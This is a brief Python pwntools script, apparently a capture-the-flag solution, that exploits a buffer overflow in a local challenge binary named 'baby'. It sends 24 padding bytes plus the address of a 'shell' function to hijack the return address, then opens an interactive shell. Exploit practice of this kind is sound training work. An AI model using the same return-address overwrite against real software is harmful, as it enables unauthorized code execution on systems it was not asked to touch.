from pwn import *

e = ELF("./baby")
p = process("./baby")

shell_addr = e.symbols["shell"]
payload = b"A" * 24 + p64(shell_addr)
print(f"Payload: {payload}")

p.sendline(payload)
p.interactive()
